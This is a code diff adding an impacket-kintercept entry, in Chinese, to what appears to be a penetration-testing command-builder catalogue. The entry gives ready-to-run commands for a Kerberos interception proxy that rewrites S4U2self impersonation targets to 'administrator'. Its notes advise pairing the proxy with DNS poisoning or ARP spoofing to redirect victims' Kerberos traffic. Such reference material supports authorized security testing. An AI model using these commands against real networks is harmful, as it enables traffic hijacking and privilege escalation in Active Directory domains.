@@ -1,8 +1,51 @@
-// 参数定义来源为本机 impacket v0.14.0.dev0 --help 与官方 examples
+// 参数定义来源为本机 impacket v0.13.1 --help 与官方 examples
 import type { Tool } from '../../../types';
 import { buildImpacketAuth, buildImpacketDomainAuth, q, v } from '../../../lib/auth';
 
 export const impacketKerberosTools: Tool[] = [
+  {
+    id: 'kintercept',
+    name: 'impacket-kintercept',
+    category: 'impacket',
+    homepage: 'https://github.com/fortra/impacket/blob/master/examples/kintercept.py',
+    description: 'Kerberos TCP 拦截代理：在 AS-REQ/TGS-REQ 转发过程中篡改请求/回复 (s4u2else/tgs-rep-user 等 handler)，用于 Kerberos 中继与委派攻击研究',
+    commands: [
+      {
+        id: 'kintercept-proxy',
+        title: '启动 KDC 拦截代理',
+        description: '本地监听 88 端口并将流量转发到真实 KDC，配合 hosts/DNS 劫持把受害者 Kerberos 流量导向本机',
+        build: (p) => `impacket-kintercept --listen-addr ${v(p.localIP, 'LHOST')} --listen-port 88 ${v(p.dcIP, 'KDC_IP')}`,
+        usage: `位置参数:
+  server   真实 KDC (域控) 地址，拦截到的流量最终转发给它
+关键参数:
+  --server-port PORT  KDC 端口 (默认 88)
+  --listen-port PORT  本地监听端口 (默认 88，需 root)
+  --listen-addr IP    本地监听地址 (默认所有接口)
+说明:
+  该工具是本机代理，无任何目标认证参数
+  需配合 DNS 投毒/hosts 篡改/ARP 欺骗使受害者把 KDC 解析到攻击机
+  注意: 依赖 Python 的 asyncore 模块，Python 3.12+ 已将其移除，
+  新版环境需用 Python 3.11 运行 (本机直接执行会报 ModuleNotFoundError)`,
+        example: `impacket-kintercept --listen-addr 10.10.14.5 --listen-port 88 10.0.0.10`,
+      },
+      {
+        id: 'kintercept-s4u2else',
+        title: 's4u2else 请求篡改',
+        description: '--request-handler s4u2else:USER 拦截 S4U2self 请求并把模拟目标改为指定用户',
+        build: (p) => `impacket-kintercept --listen-addr ${v(p.localIP, 'LHOST')} --request-handler s4u2else:${v(p.targetObject, 'TARGET_USER')} ${v(p.dcIP, 'KDC_IP')}`,
+        usage: `位置参数:
+  server   真实 KDC (域控) 地址
+关键参数:
+  --request-handler HANDLER:ARG   请求方向处理器
+      s4u2else:user    拦截 S4U2self 请求，将被模拟用户替换为 ARG 指定的用户
+  --reply-handler HANDLER:ARG     回复方向处理器
+      tgs-rep-user:user  篡改 TGS-REP 中的用户名
+说明: 经典用途是 Kerberos 中继/委派链研究——在不掌握被模拟账户凭据的情况下，
+篡改经过代理的 Kerberos 报文字段。仅用于授权环境下的协议安全研究`,
+        example: `impacket-kintercept --listen-addr 10.10.14.5 --request-handler s4u2else:administrator 10.0.0.10`,
+      },
+    ],
+  },
   {
     id: 'GetUserSPNs',
     name: 'impacket-GetUserSPNs',
